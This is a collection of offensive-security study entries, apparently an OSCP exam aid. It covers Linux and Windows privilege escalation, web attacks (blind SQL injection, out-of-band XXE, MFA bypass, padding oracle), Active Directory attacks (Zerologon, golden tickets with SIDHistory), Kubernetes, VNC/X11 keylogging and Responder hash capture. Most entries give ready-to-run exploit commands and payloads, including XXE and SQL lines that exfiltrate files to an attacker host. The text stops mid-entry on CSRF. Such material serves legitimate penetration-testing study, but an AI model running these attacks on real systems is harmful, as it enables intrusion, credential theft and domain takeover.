Docker **TCP** port is open on the network: `docker -H tcp://<IP>:2375 run ...`.

## Related escapes
Inside a **privileged** container, or one with host PID/namespaces or risky capabilities, you can
break out to the host — see container-escapes. The docker-socket case is the most common and the
cleanest.

## Pattern
"docker group or socket access -> run a container mounting / -> chroot -> root on the host." Check
group membership first in every Linux privesc. (See: container-escapes, capabilities-deepdive,
linux-enum-checklist.)

entries.title: lxd / lxc group = root on the host
entries.brief: The classic lxd-group escalation: an unprivileged container mounting the host
entries.body:
## Same principle as docker
Membership of the **lxd** (or **lxc**) group lets you manage containers via a root daemon. You create
an **unprivileged container**, mount the **host root filesystem** into it, and read/write it as root.
A very common OSCP-box path once you spot `id` showing lxd.

## Confirm
    id         # 'lxd' or 'lxc' present?

## Exploit
    # 1. get a small image onto the box (build offline, or use a cached one):
    #    (build Alpine image with distrobuilder, or download build-alpine and run it)
    lxc image import ./alpine.tar.gz --alias myimg     # import the image
    lxc image list                                     # confirm
    # 2. launch it privileged + mount the host's / :
    lxc init myimg r00t -c security.privileged=true
    lxc config device add r00t host-root disk source=/ path=/mnt/root recursive=true
    lxc start r00t
    lxc exec r00t /bin/sh
    # 3. inside: /mnt/root is the HOST filesystem, writable as root
    #    -> add a UID-0 user, copy an SSH key, or chmod +s a shell
If lxd isn't initialised yet: `lxd init` (accept defaults) first.

## Why it works
`security.privileged=true` plus a host disk device maps the real root FS into a container you fully
control — the container's root maps to host root through the mount.

## Pattern
"id shows lxd/lxc -> import a tiny image -> privileged container with / mounted -> write as root."
Nearly identical to the docker case; always check both groups. (See: docker-socket-privesc,
container-escapes.)

entries.title: Abusing sudo-allowed binaries (GTFOBins)
entries.brief: How to turn a single NOPASSWD binary into a root shell via its own features
entries.body:
## The method
`sudo -l` shows which commands you may run as root. **Almost any** such binary can be bent into a
root shell, file read/write, or command exec by abusing a legitimate feature — spawning a shell,
`-exec`, a config/script option, or an editor escape. **GTFOBins** catalogues the exact one-liner per
binary; `oscp gtfo <binary>` has them offline.

## Read sudo -l carefully
    sudo -l
    # (user) NOPASSWD: /usr/bin/find
    # note: NOPASSWD vs needing a password; exact path; wildcards; SETENV; env_keep
The entry tells you the binary **and** any constraints (fixed args kill some tricks; a wildcard helps).

## Common shell escapes (run under sudo so the shell is root)
    sudo find . -exec /bin/sh \; -quit
    sudo vim -c ':!/bin/sh'                 # or :shell   (less/more/man: !/bin/sh)
    sudo awk 'BEGIN{system("/bin/sh")}'
    sudo python3 -c 'import os; os.system("/bin/sh")'
    sudo nmap --interactive  then  !sh      # old nmap
    sudo env /bin/sh                        # env runs a command
    sudo tar -cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh

## When the binary can't spawn a shell
Use its **file** powers instead: read `/etc/shadow` (`sudo <pager> /etc/shadow`), or **write** a new
root user to `/etc/passwd` (sudo tee/cp), or overwrite a cron/script that runs as root.

## Workflow
1. `sudo -l` -> 2. `oscp gtfo <binary>` (or GTFOBins) -> 3. pick the technique allowed by the exact
rule -> 4. root shell / file primitive.

## Pattern
"sudo -l -> look up the binary in GTFOBins -> use its feature to get a root shell or write a root
account." The single highest-yield Linux privesc check. (See: sudoers-file, su-vs-sudo,
suid-concept, writable-passwd-shadow-privesc.)

entries.title: GraphQL enumeration & testing
entries.brief: How to map a GraphQL API and the bug classes that follow from it
entries.body:
## Why GraphQL needs its own pass
One endpoint (usually `/graphql`) handles everything via a typed schema. The classic web bugs still
apply, but you first **map the schema**, and GraphQL adds a few of its own issues (introspection
leaks, batching abuse, nested-query DoS, per-field authz gaps).

## 1. Find and fingerprint
Common paths: `/graphql`, `/graphiql`, `/api/graphql`, `/v1/graphql`, `/query`. Send a probe:
    {"query":"{__typename}"}        # a JSON reply with "__typename" = GraphQL here
`graphw00f` fingerprints the engine (Apollo, Hasura, etc.).

## 2. Introspection = the full map
If introspection is on, you get the **entire schema** — every type, query, mutation and argument:
    {"query":"{__schema{types{name fields{name}}}}"}
Use **GraphQL Voyager** / **InQL** (Burp) to visualise it. If introspection is **disabled**, recover
the schema by brute-forcing field names with **clairvoyance** (it reads the error suggestions).

## 3. Then test the normal bug classes
- **Authz / IDOR**: call sensitive **queries/mutations** directly; change an `id` argument to another
  user's object. GraphQL often enforces authz unevenly per field.
- **Injection**: arguments reaching a DB/OS -> SQLi/NoSQLi/command injection as usual.
- **Info leak**: verbose errors, `description` fields, hidden mutations (deleteUser, makeAdmin).

## 4. GraphQL-specific
- **Batching**: send an **array** of queries in one request to bypass rate limits / brute MFA or logins.
- **Nested-query DoS**: deeply nested relations explode cost (a depth-limit finding).
- **CSRF**: if it accepts `application/x-www-form-urlencoded` + cookie auth.

## Pattern
"Find /graphql -> introspect (or clairvoyance) to map it -> enumerate every query/mutation -> test
authz/IDOR + injection + batching." (See: idor-access-control, api-and-graphql, nosql-injection.)

entries.title: Windows pivoting with netsh portproxy
entries.brief: Turning a compromised Windows host into a relay with built-in tools
entries.body:
## When you have a Windows foothold and no tools
`netsh interface portproxy` is a **built-in** Windows port forwarder — no upload needed. Use it to
expose an internal service through the compromised host, or to reach deeper hosts it can see.

## Forward a port (v4-to-v4)
    netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=3389 \
      connectaddress=10.10.20.5 connectport=3389
Now `<compromised-host>:3389` reaches the internal `10.10.20.5:3389`. From your box, RDP to the
compromised host's IP on 3389 and you land on the internal target.

## Manage the rules
    netsh interface portproxy show all           # list
    netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=3389   # clean up

## Open the firewall for your listen port
    netsh advfirewall firewall add rule name="fwd" dir=in action=allow protocol=TCP localport=3389

## Pick the right pivot tool
- **portproxy** — single ports, built-in, survives as a config (remember to delete it).
- **chisel / ligolo-ng** — when you need a **SOCKS** proxy into a whole subnet or reverse tunnels
  through a firewall (upload a single binary). (See those in atlas.)
- **SSH -L/-R/-D** — if an SSH client/server is available (ssh-tunneling-patterns).
- **plink.exe** — SSH from Windows to your box for a reverse tunnel.

## Pattern
"Built-in + single port -> netsh portproxy; whole subnet / through a firewall -> chisel/ligolo SOCKS."
Always record and delete the rules you add. (See: port-forwarding, proxychains-pivoting,
pivoting-playbook, ssh-tunneling-patterns.)

entries.title: Blind SQL injection — boolean, time & OOB
entries.brief: Extracting data when the app shows no query output or errors
entries.body:
## When there's no visible output
The injection works but you see no rows and no error — only the app's **behaviour** changes. You
extract data one bit/char at a time by asking true/false questions. Confirm the bug with the
true/false pairs on sqli-logic before you start extracting.

## 1. Boolean-based
The page differs for TRUE vs FALSE (content, length, a word present/absent):
    ' AND 1=1-- -        -> "normal" page
    ' AND 1=2-- -        -> "different" page   (confirms boolean blind)
Then extract character by character:
    ' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -
Binary-search each char (compare with `>` to halve the range). Automate with a script or sqlmap.

## 2. Time-based (no visible difference at all)
Make the DB **sleep** when a condition is true; measure the response time:
    ' AND IF(SUBSTRING(user(),1,1)='r', SLEEP(3), 0)-- -     # MySQL
    '; IF (1=1) WAITFOR DELAY '0:0:3'-- -                    # MSSQL
    ' AND 1=(SELECT 1 FROM PG_SLEEP(3))-- -                  # PostgreSQL
Slow but universal — works when the only signal is latency.

## 3. Out-of-band (OOB) — exfil to you
If the DB can make network calls, make it hit **your** server with the data (fastest blind method):
    '; EXEC master..xp_dirtree '\\'+(SELECT TOP 1 pwd FROM users)+'.<collab>\x'-- -   # MSSQL -> SMB/DNS
    # MySQL LOAD_FILE/UNC, Oracle UTL_HTTP/UTL_DNS, etc.
Watch DNS/HTTP/SMB on your box (Burp Collaborator, responder, tcpdump).

## 4. Let the tool do it
    sqlmap -u '<url>' --technique=BT --dump         # Boolean + Time
    oscp atlas sqlmap
...but understand the manual method — the exam may need a tailored payload sqlmap won't find.

## Pattern
"No output? boolean (behaviour) -> no behaviour change? time (SLEEP/WAITFOR) -> DB can reach out? OOB
(fastest)." (See: sqli-logic, sqli-to-rce, sqlmap-workflow.)

entries.title: MFA / 2FA bypass techniques
entries.brief: Where a second factor fails to actually protect the action
entries.body:
## The mindset
2FA only helps if it's enforced **on every step and every endpoint**. Most bypasses are logic flaws,
not crypto. After submitting the first factor you often hold a partial session — test what that
session can already do.

## Common bypasses
- **Skip the step (forced browsing)**: after password, the app sends you to `/2fa`. Try navigating
  straight to `/dashboard` or the post-login API — is the session already fully authenticated?
- **Response manipulation**: the verify response is `{"success":false}` / `{"2faRequired":true}` —
  change it to `true`/`false` (client trusts it).
- **Status-code / redirect**: a `4xx` on wrong OTP but the sensitive response still contains data.
- **OTP brute force**: no rate limit / no lockout on the 6-digit code -> try all (use Burp Intruder /
  ffuf). Also check if the **same code** is reusable or doesn't expire.
- **Backup/recovery codes** with weak limits, or a password-reset flow that **skips** 2FA entirely
  (reset the password -> log in without the factor). (See: password-reset-poisoning.)
- **Remember-me / trust-this-device** token that's guessable or not bound to the user.
- **Direct object reference on verify**: submit your OTP but the victim's user id (the code isn't
  bound to the account). (See: idor-access-control.)
- **Null/empty OTP**, or reusing a leaked code from the response/Referer.

## How to test
1. Log in with valid creds, pause at the 2FA prompt. 2. Enumerate what the partial session can reach.
3. Fuzz the OTP (rate limit? expiry? reuse?). 4. Tamper the verify request/response. 5. Try the
reset/recovery path.

## Pattern
"Is 2FA enforced on the actual action, or just the UI? -> forced browsing, response tampering, OTP
brute, reset-skips-2FA, OTP-not-bound-to-user." (See: web-auth-bypass, account-takeover-logic.)

entries.title: Padding oracle attacks (CBC)
entries.brief: How different error responses on bad padding let you decrypt and forge ciphertext
entries.body:
## The vulnerability
With **CBC** mode encryption, if the app reveals (by error message, status code, or timing) whether a
submitted ciphertext had **valid padding**, that yes/no "oracle" lets you **decrypt the ciphertext
without the key** — and even **encrypt arbitrary plaintext** of your choosing. Classic target:
encrypted cookies/tokens (session, "remember me", viewstate) you can resend.

## Why it works (intuition)
CBC decrypts a block then XORs with the previous ciphertext block. By tweaking the previous block byte
by byte and watching whether padding becomes valid, you recover the **intermediate decryption** of each
block -> XOR with the real previous block = plaintext. Reverse it to craft a chosen-plaintext
ciphertext.

## Detect it
- The app takes an **encrypted blob** from you (cookie, URL param, hidden field) and decrypts it.
- Tampering the blob yields a **different error** for "bad padding" vs "bad data/valid padding" (e.g.
  500 vs 200, or a distinct message/length), or a **timing** difference.

## Exploit
    padbuster http://t/page <ciphertext> <blocksize> -cookies 'auth=<ciphertext>'    # decrypt
    padbuster ... -plaintext '{"user":"admin"}'                                       # forge/encrypt
    oscp atlas padbuster
Block size is usually 8 or 16. For forging, you build a token that decrypts to **your** chosen value
(e.g. flip role to admin).

## Pattern
"App decrypts a blob I control + leaks padding validity (error/status/timing) -> padbuster decrypts,
then forges an admin token." A top OSWE-style crypto bug. (See: crypto-ctf-basics, cookies-sessions-jwt.)

entries.title: Hash length-extension attacks
entries.brief: Why MAC = hash(secret || message) lets an attacker append data without the secret
entries.body:
## The flawed construction
A weak signature scheme computes `signature = H(secret || message)` with a Merkle-Damgard hash
(**MD5, SHA-1, SHA-256**). Because those hashes process data block by block and the final state **is**
the output, an attacker who knows `message`, the `signature`, and the **length of secret** can compute
a valid signature for `message || padding || anything` — **without knowing the secret**. You can append
data to a signed message and still have it verify.

## Where it appears
APIs/cookies that sign parameters: `?user=bob&role=user&sig=<H(secret||"user=bob&role=user")>`.
Append `&role=admin` (parsers that take the **last** duplicate win) with a recomputed signature.

## Exploit
    hash_extender --data 'user=bob&role=user' --secret <LEN> --append '&role=admin' \
      --signature <orig> --format sha256
    # or: hashpump -s <orig> -d 'user=bob&role=user' -a '&role=admin' -k <secret-length>
    oscp atlas hashpump
It outputs the **new signature** and the **new data** (with the glue padding as URL/hex escapes). Send
both. You usually brute the **secret length** (try 1-64).

## The fix (what to recommend)
Use **HMAC** (`HMAC(secret, message)`), which is immune — not a raw `H(secret||message)`.

## Pattern
"Signature = H(secret||data) with MD5/SHA-x -> hashpump to append data + forge the sig (brute the
secret length)." Look for home-grown MACs on signed parameters. (See: crypto-ctf-basics,
cookies-sessions-jwt, hashes-and-formats.)

entries.title: HTTP verb tampering & method bypass
entries.brief: Swap the HTTP method to bypass auth rules or reach dangerous verbs (PUT/DELETE)
entries.body:
## The idea
Access controls are often written for specific methods (e.g. 'deny GET/POST to /admin'). Sending a
different or unexpected method can skip the check, or reach a dangerous verb the server still honours.

## Auth bypass via method
    # protection only covers GET/POST? try HEAD, or an arbitrary method:
    curl -X HEAD http://t/admin ; curl -X FOO http://t/admin
    # some stacks treat an unknown method as GET but skip the auth filter

## Dangerous verbs enabled
    curl -X OPTIONS http://t/ -i          # Allow: header lists accepted methods
    curl -X PUT http://t/shell.jsp --data-binary @shell.jsp    # WebDAV/IIS misconfig -> upload
    curl -X DELETE http://t/resource/1    # unintended state change

## Method override headers
    X-HTTP-Method-Override: PUT      # frameworks honour these to tunnel a method over POST
    X-HTTP-Method / X-Method-Override : DELETE

## Gotchas
- Always check OPTIONS / the Allow header first to see what the server accepts.
- PUT-enabled servers (WebDAV, some Tomcat/IIS) = direct file upload -> RCE (see webdav-exploitation).
- Pair with path/case tricks and 403 bypass tools (atlas: nomore403/dontgo403).

entries.title: Blind & out-of-band XXE
entries.brief: Exfiltrating data via XXE when the response shows nothing
entries.body:
## When in-band XXE fails
The parser processes entities but **doesn't reflect** them in the response (blind), or direct file
reads are blocked. You go **out-of-band**: make the server fetch an **external DTD from you** that
exfiltrates data over a channel you watch.

## 1. Confirm OOB (callback)
Host a listener; inject an external entity that calls back:
    <?xml version="1.0"?>
    <!DOCTYPE r [ <!ENTITY x SYSTEM "http://<ATTACKER>/ping"> ]>
    <r>&x;</r>
A hit on your HTTP/DNS = the parser fetches external resources (OOB possible).

## 2. OOB exfiltration via an external DTD
Serve `evil.dtd` on your box:
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://<ATTACKER>/?d=%file;'>">
    %eval; %exfil;
Then the payload pulls it in:
    <!DOCTYPE r [ <!ENTITY % dtd SYSTEM "http://<ATTACKER>/evil.dtd"> %dtd; ]>
The file contents arrive base64'd in your web log's `?d=` parameter. (Use `php://filter` so newlines
don't break the entity.)

## 3. Error-based (no OOB egress)
If the server can't reach you, leak data in a **parser error message** by referencing a nonexistent
file through the captured data, so the path (containing your data) appears in the error.

## 4. Where to inject
Not just obvious XML endpoints: **SOAP**, SVG uploads, **DOCX/XLSX/PPTX** (they're zipped XML), RSS,
SAML, and any `Content-Type: application/xml` or `text/xml` body.

## Pattern
"No reflection -> callback to confirm OOB -> external DTD exfil via php://filter -> read it from your
log; no egress -> error-based." (See: xxe-logic, ssrf-logic, file-read-primitives.)

entries.title: logrotate privesc (logrotten)
entries.brief: Abuse logrotate's race/config when you control a rotated log or its config
entries.body:
## Two routes
logrotate runs as root. You can escalate if (a) you can write a log it rotates and win a race
(logrotten, CVE-2018-16948/related), or (b) you can edit a logrotate config to run a command.

## Route A - logrotten (race on a writable log dir)
    # you control a log file that root's logrotate processes:
    git clone <logrotten> ; gcc logrotten.c -o logrotten
    ./logrotten -p ./payload /path/you/control/app.log
    # payload runs as root when logrotate rotates the log (post-rotate race)
    # trigger a rotation by filling the log past its size threshold

## Route B - writable logrotate config
    # if /etc/logrotate.d/<file> or logrotate.conf is writable, add a postrotate hook:
    #   postrotate
    #     cp /bin/bash /tmp/rb; chmod +s /tmp/rb
    #   endscript
    # runs as root on the next rotation

## Gotchas
- Route A is a race - may need several tries and the right logrotate options (create/compress).
- You need the log (or config) to be in a dir YOU can write and that root's logrotate touches.
- Confirm logrotate runs as root (cron/systemd timer) and its schedule. See enumeration-checklist-linux.

entries.title: SID history abuse & cross-domain escalation
entries.brief: How SIDHistory carries privileges across domains, and how attackers inject it
entries.body:
## What SIDHistory is for (and why it's abused)
When accounts migrate between domains, **SIDHistory** stores the old SIDs so the account keeps access
to old resources. Access checks honour **every SID** in the token — including those in SIDHistory. If
an attacker can **add a privileged SID** (e.g. a Domain/Enterprise Admins SID) to an account's
SIDHistory, that account is treated as a member of those groups **without being one**.

## As a forged-ticket enhancer
The most common path: when forging a **golden ticket**, include the target domain's (or the forest
root's **Enterprise Admins**) SID via SIDHistory to jump **across a trust** to the whole forest:
    impacket-ticketer -nthash <krbtgt> -domain-sid <CHILD-SID> -domain child.corp.local \
      -extra-sid <ROOT-SID>-519 Administrator          # -519 = Enterprise Admins
    # (mimikatz: kerberos::golden ... /sids:<ROOT>-519)
This is the classic **child-domain -> forest-root** escalation (SID filtering across intra-forest
trusts historically didn't block this).

## As direct injection (persistence)
With DA/replication rights, an attacker can write a privileged SID into a user's SIDHistory
attribute (e.g. via DCShadow or mimikatz `sid::patch`/`sid::add`) so a low-priv account silently
holds high privilege. (See: dcsync-dcshadow.)

## Defensive note / what to check
SID filtering should be enabled on trusts; audit accounts with non-empty SIDHistory containing
privileged RIDs (-512/-519).

## Pattern
"Compromise a child domain's krbtgt -> forge a golden ticket with -extra-sid <forest-root>-519 ->
Enterprise Admin across the forest." The headline intra-forest escalation. (See: golden-silver-tickets,
active-directory-trusts, dcsync-dcshadow.)

entries.title: Zerologon (CVE-2020-1472)
entries.brief: How a Netlogon crypto flaw lets an unauthenticated attacker become Domain Admin
entries.body:
## The flaw in one line
A flaw in the Netlogon authentication crypto (AES-CFB8 with an all-zero IV) means that, by sending
repeated auth attempts with all-zero values, an attacker on the network can — roughly 1 in 256 tries
— authenticate as the **domain controller's computer account** and then **reset the DC's machine
password to empty**. From there you DCSync and own the domain. No credentials needed; only network
access to the DC.

## Preconditions
- Network reach to a DC's Netlogon (RPC) and an **unpatched** DC (pre-Aug-2020). You need the DC's
  **NetBIOS/computer name** (from nmap/enum4linux/`nxc smb`).

## Exploit (lab / authorised only)
    # 1. check + exploit (sets the DC machine account password to empty):
    nxc smb <DC-IP> -u '' -p '' -M zerologon            # check
    python3 cve-2020-1472-exploit.py <DC-NETBIOS> <DC-IP>   # the public PoC resets the password
    # 2. DCSync with the now-empty machine account to dump hashes (incl. krbtgt + Administrator):
    impacket-secretsdump -no-pass '<DOMAIN>/<DC-NETBIOS>$@<DC-IP>'
    # 3. use Administrator's hash:
    impacket-psexec -hashes :<admin-nthash> administrator@<DC-IP>

## The critical cleanup caveat
Resetting the machine password in AD **desyncs it from the DC's local SAM/secret**, which can break
the DC. After dumping, **restore the original machine password** (the PoC `restorepassword` step /
`impacket-changentlm`), using the plaintext from the registry/secrets you dumped. On exams/labs this
matters so you don't brick the box.

## Pattern
"Unpatched DC -> zerologon resets its machine password to empty -> secretsdump (DCSync) -> psexec as
Administrator -> RESTORE the machine password." (See: dcsync-dcshadow, eternalblue-ms17010,
coercion-ntlm-relay.)

entries.title: Kubernetes attacks — kubelet, API & tokens
entries.brief: How a container foothold or exposed k8s component leads to cluster compromise
entries.body:
## The pieces
A Kubernetes cluster has an **API server** (6443/8443), **kubelets** (10250) on each node, and every
pod carries a **service-account token**. Attacks chain an exposed component or a pod foothold into
reading secrets, running on other pods/nodes, and often the host.

## 1. From inside a pod (most common)
Every pod mounts its SA token:
    cat /var/run/secrets/kubernetes.io/serviceaccount/token
    cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
    env | grep KUBERNETES            # API server host/port
    # use the token against the API:
    kubectl --token=$TOK --server=https://<API>:6443 --insecure-skip-tls-verify auth can-i --list
Over-privileged SAs let you read **secrets**, create pods, or exec into others:
    kubectl ... get secrets -A -o yaml          # creds/keys live here
    kubectl ... run x --image=alpine -it --rm -- sh

## 2. Exposed kubelet (10250)
Often unauthenticated: list pods and exec commands directly on a node's containers.
    curl -sk https://<NODE>:10250/pods
    curl -sk https://<NODE>:10250/run/<ns>/<pod>/<container> -d "cmd=id"

## 3. Node / host breakout
Create a **privileged pod** (or one that mounts the host FS / hostPID) to escape to the node:
    # a pod with hostPath volume mounting / , or securityContext.privileged: true
    # -> chroot the host filesystem = root on the node   (see: container-escapes)

## 4. Exposed API / etcd
Anonymous API access, or **etcd** (2379) without auth, exposes all secrets and config.

## Pattern
"Pod foothold -> read the SA token -> `kubectl auth can-i` -> abuse RBAC (secrets / exec / privileged
pod) -> node; or hit an exposed kubelet/API/etcd directly." (See: container-escapes, cloud-basics,
docker-socket-privesc.)

entries.title: Oracle TNS (1521) — enumeration & attack
entries.brief: SID discovery, credential attacks and code execution against Oracle databases
entries.body:
## The listener
Oracle databases front a **TNS listener** on **1521**. You need a valid **SID** (database instance
name) to talk to it, then credentials. `odat` automates the whole chain.

## 1. Enumerate the listener + SID
    nmap -p1521 -sV --script oracle-tns-version,oracle-sid-brute <TARGET>
    odat sidguesser -s <TARGET> -p 1521          # brute the SID
    odat tnscmd -s <TARGET> --version            # listener info (older: unauthenticated)

## 2. Credential attack
    odat passwordguesser -s <TARGET> -p 1521 -d <SID> --accounts-file accounts.txt
Default accounts are rife: `scott/tiger`, `system/manager`, `sys/change_on_install`,
`dbsnmp/dbsnmp`. Oracle hashes crack with hashcat (`-m 3100` for the old DES-based type).

## 3. Post-auth: files & code execution
With valid creds, odat does the heavy lifting:
    odat all -s <TARGET> -d <SID> -U <user> -P <pass>        # run every check
    odat utlfile  ... --putFile  <dir> shell.exe local.exe   # write files
    odat externaltable ... --exec <dir> "cmd"                # run OS commands (external tables)
    odat dbmsscheduler ... --exec ...                        # or via the scheduler
These give **command execution as the Oracle account** on the DB host.

## Pattern
"TNS 1521 -> brute the SID (odat sidguesser) -> guess creds -> odat for file write / OS command exec
(utlfile / external table / scheduler)." (See: database-enum, mssql-abuse, sqli-to-rce.)

entries.title: VNC (5900+) — enumeration & access
entries.brief: Reaching a remote desktop via no-auth VNC or a recovered stored password
entries.body:
## The service
VNC exposes a remote desktop, usually on **5900** (5901, 5902... for extra displays; 6000-range is
X11, different). Two common wins: **no authentication**, or a **stored/weak password** you recover
and crack.

## 1. Find and fingerprint
    nmap -p5900-5902 -sV --script vnc-info,realvnc-auth-bypass <TARGET>
`vnc-info` shows the security types; some old RealVNC versions (CVE-2006-2369) allow an
**auth bypass**.

## 2. Connect
    vncviewer <TARGET>:5900                 # prompts for a password (or none if open)
    # headless check:  nmap --script vnc-title, or vncsnapshot
No-auth VNC = instant desktop. You often land on a logged-in user's session.

## 3. Recover a stored VNC password
VNC stores its password **DES-encrypted with a fixed key** — trivially reversible. If you find a
config during enumeration (e.g. in a user's home, a registry hive, or `.vnc/passwd`):
    # the 8-byte obfuscated password -> plaintext:
    vncpwd <passwd-file>            # or the known-key python one-liner
Then `vncviewer` in.

## 4. Brute (if needed, in scope)
    hydra -P rockyou.txt vnc://<TARGET>

## Pattern
"nmap vnc-info -> open? connect straight in. Found a .vnc/passwd? decrypt it (fixed DES key) ->
vncviewer. Else brute." Often drops you onto a live GUI session as a user. (See: creds-hunting,
legacy-services.)

entries.title: X11 (6000+) — open display abuse
entries.brief: Keylogging and screenshotting an exposed, unauthenticated X server
entries.body:
## The service
An X11 server listens on **6000 + display-number** (6000 = :0). If it's configured with **no access
control** (`xhost +`, or started insecurely), anyone who can reach it can **read the screen, log
keystrokes, and inject input** — no password.

## 1. Detect an open display
    nmap -p6000-6005 -sV --script x11-access <TARGET>
`x11-access` reports "X server access is granted" when it's open.

## 2. Abuse it
    export DISPLAY=<TARGET>:0
    xdpyinfo                      # confirm you can talk to it
    xwd -root -out screen.xwd ; convert screen.xwd screen.png    # screenshot the desktop
    xwininfo -root -tree         # enumerate windows (titles can leak info)
    # keylogging:
    xspy <TARGET>:0              # or xinput test on a keyboard device -> capture keystrokes
Watching keystrokes on a logged-in admin's session harvests passwords typed into su/sudo/ssh.

## Pattern
"nmap x11-access -> open? set DISPLAY=<host>:0 -> xwd screenshots + xspy keylog -> capture creds the
user types." Rare but a clean win when present. (See: vnc-enum, creds-hunting.)

entries.title: IPsec/IKE VPN (500) — aggressive-mode PSK
entries.brief: Enumerating an IKE endpoint and cracking a pre-shared key leaked in aggressive mode
entries.body:
## The service
IPsec VPNs negotiate via **IKE on UDP 500** (and 4500 for NAT-T). The classic flaw is **IKE
aggressive mode**: the gateway sends a **hash of the pre-shared key (PSK)** in response to an
unauthenticated request — which you capture and crack offline.

## 1. Enumerate the IKE service
    sudo ike-scan <TARGET>                      # is IKE present? which transforms?
    sudo ike-scan -M <TARGET>                   # multiline, readable

## 2. Pull the aggressive-mode hash
    sudo ike-scan --aggressive --pskcrack=hash.txt -n fakegroup <TARGET>
If the gateway answers in aggressive mode, `hash.txt` now holds the PSK hash material.

## 3. Crack the PSK offline
    psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
    # or brute a charset:  psk-crack -b 5 hash.txt
A cracked PSK + a valid username (often enumerable, or XAUTH) lets you connect with a VPN client
(e.g. `strongswan`/`openconnect`), landing you inside the internal network.

## Pattern
"ike-scan finds IKE -> --aggressive dumps the PSK hash -> psk-crack it -> connect -> internal foothold."
A quiet perimeter win when aggressive mode is enabled. (See: pivoting-playbook, port-forwarding.)

entries.title: GitLab exploitation
entries.brief: Version-driven CVEs, SSRF, and looting CI/CD secrets from a GitLab instance
entries.body:
## 1. Fingerprint the version
GitLab shows its version at `/help` (when logged in), in `/assets` hashes, or via the API
(`/api/v4/version` with a token). Map the exact version to CVEs — GitLab has had many high-impact
unauth bugs.

## 2. Known unauth / high-impact CVEs (match the version)
- **CVE-2021-22205** — unauthenticated **RCE** via a malicious image (ExifTool/DjVu) on upload. A
  headline GitLab exploit; public PoCs give a shell as `git`.
- **CVE-2023-7028** — **account takeover**: password-reset email could be sent to an attacker-
  controlled address (no interaction).
- Older: SSRF in the project import / webhook features (reach internal services, cloud metadata).
Run `searchsploit gitlab <version>` and match.

## 3. Authenticated / post-foothold loot
GitLab is a **secrets goldmine**:
- **CI/CD variables** (project & group settings) — deploy keys, cloud creds, registry passwords.
- **`.gitlab-ci.yml`** and job logs — often echo secrets.
- **Repositories** — grep history for keys (`trufflehog`/`gitleaks`).
- **Personal/Project access tokens**, runner registration tokens (-> register a malicious runner ->
  code exec on CI).
- The server's **`gitlab.rb` / secrets** if you land a shell -> `gitlab-rails runner` as the app.

## Pattern
"Fingerprint version -> match a CVE (21-22205 RCE, 23-7028 ATO, SSRF) -> or, with access, loot CI/CD
variables, tokens and repo history." (See: git-exposure, ssrf-logic, cloud-metadata-ssrf.)

entries.title: Cached domain credentials (MSCache / DCC2)
entries.brief: Why domain users' logons are stored on a workstation, and how to crack them
entries.body:
## Why they exist
So a domain user can log in when the DC is unreachable, Windows caches the last N domain logons
locally as **MS Cache v2 (DCC2 / 'mscash2')** hashes in the **SECURITY** registry hive. On a
compromised domain-joined host with SYSTEM, these give you **domain** account material even if LSASS
is clean.

## Dump them
    # remote (admin creds/hash):
    impacket-secretsdump <DOMAIN>/<admin>:<pass>@<TARGET>      # prints "$DCC2$..." lines
    # local on the host (need SYSTEM): save the hives then parse:
    reg save HKLM\SYSTEM sys.hiv & reg save HKLM\SECURITY sec.hiv
    impacket-secretsdump -security sec.hiv -system sys.hiv LOCAL
    # mimikatz:  lsadump::cache
Output looks like `$DCC2$10240#username#<hash>`.

## Crack them (offline only — no pass-the-hash)
Unlike NT hashes, **DCC2 cannot be passed** — you must crack it:
    hashcat -m 2100 '$DCC2$10240#user#<hash>' /usr/share/wordlists/rockyou.txt
It's deliberately slow (PBKDF2-like), so success depends on a weak password + a good wordlist/rules.

## When it matters
You have SYSTEM on a workstation but LSASS/SAM only yields local accounts. Cached creds may hand you
a **domain** user (sometimes a privileged one who logged in there) to move laterally.

## Pattern
"SYSTEM on a domain host -> secretsdump the SECURITY hive -> $DCC2$ hashes -> hashcat -m 2100 (can't
PtH) -> a domain credential for lateral movement." (See: lsass-dumping, hashes-and-formats,
password-cracking-workflow.)

entries.title: LLMNR/NBT-NS poisoning — capture NetNTLM with Responder
entries.brief: Answer broadcast name lookups to collect NetNTLMv2 hashes for offline cracking
entries.body:
## The idea
When Windows fails DNS, it falls back to LLMNR (5355/udp) and NBT-NS (137/udp) **broadcasts**.
Anyone on the subnet can answer 'that's me', and the victim then authenticates to you — handing
over a **NetNTLMv2** response you can crack offline or relay (see **smb-relay-attack**).

## Run the poisoner
    sudo responder -I eth0 -wv            # analyze first with -A to stay passive
    # hashes land in /usr/share/responder/logs/ and on screen
Trigger faster by browsing to a bad name (typo shares, `\\nonexistent`), or just wait.

## Crack what you catch
    hashcat -m 5600 hashes.txt rockyou.txt       # NetNTLMv2
    john --format=netntlmv2 hashes.txt
NetNTLMv1 (-m 5500) is far weaker — if you see it, you can often get the NT hash directly.

## When to relay instead of crack
If the captured account is privileged and target SMB signing is **not enforced**, relay the auth
rather than crack it — turn off Responder's SMB/HTTP servers and use ntlmrelayx (see that note).

## Gotchas
- Turn OFF Responder's SMB & HTTP servers (Responder.conf) when you intend to RELAY, or it
  captures instead of forwarding.
- Noisy and disruptive — on real engagements get scope sign-off; on exams it's expected.
- Machine accounts (`HOST$`) crack essentially never; focus on user hashes.

entries.title: Cross-Site Request Forgery (CSRF)
entries.brief: Making a victim's browser perform an authenticated action they didn't intend
entries.body:
## The mechanism Browsers attach a site's **cookies automatically** to any request to that site — even one triggered by a **different** site. If a state-changing action relies only on the cookie (no unpredictable token), an attacker page can make the logged-in victim's browser **submit that action** (change email, add an admin, transfer funds) without the victim's intent. ## When a site is vulnerable - The action is a simple request (form POST / GET) whose only auth is the session cookie. - There's **no anti-CSRF token**, or it isn't validated / is predictable / is reusable. - `SameSite` on the cookie is `None` (or absent on older browsers) so it's sent cross-site. ## Proof-of-concept
